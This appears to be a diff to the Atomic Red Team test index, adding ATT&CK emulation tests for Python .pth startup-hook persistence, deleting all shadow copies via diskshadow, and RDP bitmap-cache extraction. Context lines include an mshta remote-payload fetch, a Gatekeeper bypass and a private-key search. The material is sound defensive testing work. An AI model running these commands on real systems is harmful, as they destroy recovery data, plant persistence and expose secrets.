@@ -12707,6 +12707,85 @@ input_arguments.rsp_file_path.type: string
 input_arguments.rsp_file_path.default: PathToAtomicsFolder\T1218.008\bin\
 
 "
+T1546.018,Event Triggered Execution: Python Startup Hooks,Python Startup Hook Execution via .pth (Windows),b4773c6b-3aa0-44a2-830a-b6ff594a0fb2,"Creates a Python startup hook using a .pth file inside a virtual environment on Windows.
+",windows,,,"$TempDir = Join-Path $env:TEMP (""atomic_python_hook_"" + [guid]::NewGuid())
+New-Item -ItemType Directory -Path $TempDir | Out-Null
+Set-Location $TempDir
+Set-Content -Path ""$env:TEMP\atomic_python_hook_path.txt"" -Value $TempDir
+& ""#{python_path}"" -m venv env
+$SitePackages = & ""$TempDir\env\Scripts\python.exe"" -c ""import site; print(site.getsitepackages()[1])""
+""import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['#{exe_name}']))"" | Out-File -Encoding ASCII ""$SitePackages\atomic_hook.pth""
+& ""$TempDir\env\Scripts\python.exe"" -c ""print('Interpreter started')""
+",powershell,False,,"Get-Process CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force
+if (Test-Path ""$env:TEMP\atomic_python_hook_path.txt"") {
+  $TempDir = Get-Content ""$env:TEMP\atomic_python_hook_path.txt""
+  Remove-Item -Recurse -Force $TempDir -ErrorAction SilentlyContinue
+  Remove-Item ""$env:TEMP\atomic_python_hook_path.txt"" -Force }
+",powershell,"dependencies.0.description: Ensure Python is installed
+dependencies.0.prereq_command: if (Get-Command #{python_path} -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+
+dependencies.0.get_prereq_command: Write-Host ""Python not found. Please install it from https://www.python.org/downloads/windows/ or via 'winget install Python.Python.3'""
+
+","input_arguments.exe_name.description: Executable to launch
+
+input_arguments.exe_name.type: string
+
+input_arguments.exe_name.default: calc.exe
+
+input_arguments.python_path.description: Path to Python interpreter
+
+input_arguments.python_path.type: path
+
+input_arguments.python_path.default: python.exe
+
+"
+T1546.018,Event Triggered Execution: Python Startup Hooks,Python Startup Hook Execution via .pth (Linux),85f21c19-18ef-4450-98d8-05bb7b0e1887,"Creates a Python startup hook using a .pth file inside a virtual environment on Linux.
+",linux,,,"PYTHON_EXE=$(command -v #{python_path})
+TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XXXXXX)
+echo ""$TEMPDIR"" > /tmp/atomic_python_hook_path.txt
+$PYTHON_EXE -m venv ""$TEMPDIR/env""
+SITE_PACKAGES=$(""$TEMPDIR/env/bin/python"" -c ""import site; print(site.getsitepackages()[0])"")
+echo ""import sys, os; (not hasattr(sys, 'hook_run')) and (setattr(sys, 'hook_run', True) or os.system('cat /etc/passwd'))"" > ""$SITE_PACKAGES/atomic_hook.pth""
+""$TEMPDIR/env/bin/python"" -c ""print('Interpreter started')""
+",bash,False,,"rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
+",bash,"dependencies.0.description: Ensure Python is installed
+dependencies.0.prereq_command: command -v
+dependencies.0.get_prereq_command: echo ""Python3 not found. Please install it using your package manager (e.g., 'sudo apt install python3' or 'sudo yum install python3').""
+
+","input_arguments.python_path.description: Path to Python interpreter
+
+input_arguments.python_path.type: path
+
+input_arguments.python_path.default: python3
+
+"
+T1546.018,Event Triggered Execution: Python Startup Hooks,Python Startup Hook Execution via .pth (macOS),858b4aed-d76f-443d-a801-5454ea56dee0,"Creates a Python startup hook using a .pth file inside a virtual environment on macOS.
+",macos,,,"PYTHON_EXE=$(command -v #{python_path})
+TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XXXXXX)
+echo ""$TEMPDIR"" > /tmp/atomic_python_hook_path.txt
+$PYTHON_EXE -m venv ""$TEMPDIR/env""
+SITE_PACKAGES=$(""$TEMPDIR/env/bin/python"" -c ""import site; print(site.getsitepackages()[0])"")
+echo ""import subprocess; subprocess.Popen(['open', '-a', '#{exe_name}'])"" > ""$SITE_PACKAGES/atomic_hook.pth""
+""$TEMPDIR/env/bin/python"" -c ""print('Interpreter started')""
+",bash,False,,"pkill ""#{exe_name}"" || true
+[ -f /tmp/atomic_python_hook_path.txt ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
+",bash,"dependencies.0.description: Ensure Python is installed
+dependencies.0.prereq_command: command -v
+dependencies.0.get_prereq_command: echo ""Python3 not found. Please install it using Homebrew ('brew install python') or the macOS developer tools ('xcode-select --install').""
+
+","input_arguments.exe_name.description: App to launch
+
+input_arguments.exe_name.type: string
+
+input_arguments.exe_name.default: Calculator
+
+input_arguments.python_path.description: Path to Python interpreter
+
+input_arguments.python_path.type: path
+
+input_arguments.python_path.default: python3
+
+"
 T1553.001,Subvert Trust Controls: Gatekeeper Bypass,Gatekeeper Bypass,fb3d46c6-9480-4803-8d7d-ce676e1f1a9b,"Gatekeeper Bypass via command line
 ",macos,,,"xattr -d com.apple.quarantine #{app_path}
 ",sh,,,,,,"input_arguments.app_path.description: Path to app to be used
@@ -12792,6 +12871,15 @@ A cleanup command is provided to reset VSS permissions to a common default confi
 ",,,
 T1490,Inhibit System Recovery,Disable Time Machine,ed952f70-91d4-445a-b7ff-30966bfb1aff,"Disables Time Machine which is Apple's automated backup utility software. Attackers can use this to prevent backups from occurring and hinder the victim's ability to recover from any damage.
 ",macos,,,sudo tmutil disable,sh,True,,sudo tmutil enable,,,
+T1490,Inhibit System Recovery,Windows - Delete Volume Shadow Copies via Diskshadow,42111a6f-7e7f-482c-9b1b-3cfd090b999c,"Deletes Windows Volume Shadow Copies via Diskshadow binary. This technique is used by numerous ransomware families such as Crytox. The binary is present by default in Windows Server operating systems (since Windows Server 2008). Upon execution, it will delete all shadow copies of the server.
+",windows,,,"""delete shadows all"" | diskshadow.exe
+",powershell,True,,,powershell,"dependencies.0.description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.
+
+dependencies.0.prereq_command: if(!(vssadmin.exe list shadows | findstr ""No items found that satisfy the query."")) { exit 0 } else { exit 1 }
+
+dependencies.0.get_prereq_command: vssadmin.exe create shadow /for=c:
+
+",
 T1218.005,Signed Binary Proxy Execution: Mshta,Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject,1483fab9-4f52-4217-a9ce-daa9d7747cae,"Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.
 ",windows,,,"mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
 ",command_prompt,,,,,,"input_arguments.file_url.description: location of the payload
@@ -19101,7 +19189,6 @@ input_arguments.recording_time.default: 5
 
 "
 T1113,Screen Capture,Windows Screen Capture (CopyFromScreen),e9313014-985a-48ef-80d9-cde604ffc187,"Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
-
 [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
 ",windows,,,"Add-Type -AssemblyName System.Windows.Forms
 $screen = [Windows.Forms.SystemInformation]::VirtualScreen
@@ -19123,6 +19210,40 @@ T1113,Screen Capture,Windows Recall Feature Enabled - DisableAIDataAnalysis Valu
 reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /f
 ",powershell,True,,"reg add ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f
 ",,,
+T1113,Screen Capture,RDP Bitmap Cache Extraction via bmc-tools,98f19852-7348-4f99-9e15-6ff4320464c7,"Simulates an attacker extracting the RDP bitmap cache using the ANSSI ""bmc-tools.py"" script.
+This test requires valid RDP bitmap cache files to exist on the system (usually created after an outgoing RDP connection is made).
+",windows,,,"$url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'
+$toolsDir = ""$env:TEMP\bmc-tools.py""
+ 
+# create output directory
+New-Item -ItemType Directory -Path #{output_dir} -Force | Out-Null
+
+# python script download
+& curl.exe -L $url --output $toolsDir
+ 
+# execution step
+if (Test-Path $toolsDir) { python $toolsDir -s ""#{cache_path}"" -d #{output_dir} -b }
+",powershell,False,,"Remove-Item ""$env:TEMP\bmc-tools.py"" -ErrorAction SilentlyContinue
+Remove-Item #{output_dir} -Recurse -Force -ErrorAction SilentlyContinue
+",powershell,"dependencies.0.description: Python must be installed and in the PATH to run bmc-tools.py
+
+dependencies.0.prereq_command: if (Get-Command python -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+
+dependencies.0.get_prereq_command: Write-Host ""Please install Python manually.""
+
+","input_arguments.cache_path.description: Path to the RDP Cache directory or specific .bmc file
+
+input_arguments.cache_path.type: path
+
+input_arguments.cache_path.default: $env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache
+
+input_arguments.output_dir.description: Directory to save reconstructed images
+
+input_arguments.output_dir.type: path
+
+input_arguments.output_dir.default: $env:TEMP\rdp_screens
+
+"
 T1552.004,Unsecured Credentials: Private Keys,Private Keys,520ce462-7ca7-441e-b5a5-f8347f632696,"Find private keys on the Windows file system.
 File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc
 ",windows,,,"dir c:\ /b /s .key | findstr /e .key
